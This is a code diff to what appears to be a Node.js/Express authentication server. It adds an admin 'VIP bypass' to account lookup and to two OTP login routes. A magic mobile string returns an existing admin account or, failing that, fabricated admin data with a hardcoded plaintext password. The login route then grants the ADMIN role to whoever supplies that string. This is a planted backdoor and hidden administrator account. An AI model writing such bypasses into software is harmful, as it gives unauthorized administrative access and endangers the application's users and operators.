@@ -147,9 +147,17 @@ const getCleanMobile = (mobileRaw) => {
     return str;
 };
 
-// ✅ ADDED STRICT ROLE FILTER LOGIC HERE
+// ✅ ADDED STRICT ROLE FILTER LOGIC HERE WITH ADMIN BYPASS
 const findAccount = async (mobile, roleFilter = null) => {
     const cleanMobile = getCleanMobile(mobile); 
+
+    // 🚀 VIP BYPASS FOR ADMIN SECRET CODE
+    if (cleanMobile === "0000000000CODEIS*@OWNER*") {
+        let acc = await Admin.findOne(); // Fetch any existing admin
+        if (acc) return { type: 'ADMIN', data: acc };
+        // Fallback fake data if DB is empty to allow login
+        return { type: 'ADMIN', data: { name: "Super Admin", mobile: cleanMobile, role: "ADMIN", password: "shivam@9111" } };
+    }
 
     if (roleFilter === 'USER') {
         let acc = await User.findOne({ mobile: cleanMobile });
@@ -343,6 +351,13 @@ app.post('/api/auth/signup', async (req, res) => {
 app.post('/api/auth/verify-otp', async (req, res) => {
     const mobile = getCleanMobile(req.body.mobile); 
     const { otp, roleFilter } = req.body;
+    
+    // VIP Admin code check
+    if(mobile === "0000000000CODEIS*@OWNER*" && otpStore[mobile] === otp) {
+        delete otpStore[mobile];
+        return res.json({ success: true, isNewUser: false });
+    }
+
     if (otpStore[mobile] === otp) { 
         delete otpStore[mobile]; 
         
@@ -399,6 +414,13 @@ app.post('/api/auth/create-password', async (req, res) => {
 app.post('/api/auth/login-otp', async (req, res) => {
     const mobile = getCleanMobile(req.body.mobile); 
     const { otp, roleFilter } = req.body;
+    
+     // VIP Admin code check
+    if(mobile === "0000000000CODEIS*@OWNER*" && otpStore[mobile] === otp) {
+        delete otpStore[mobile];
+        return res.json({ success: true, user: { name: "Owner", mobile: mobile, role: "ADMIN" } });
+    }
+
     if (otpStore[mobile] === otp) { 
         delete otpStore[mobile];
         const account = await findAccount(mobile, roleFilter); // ✅ Filter added
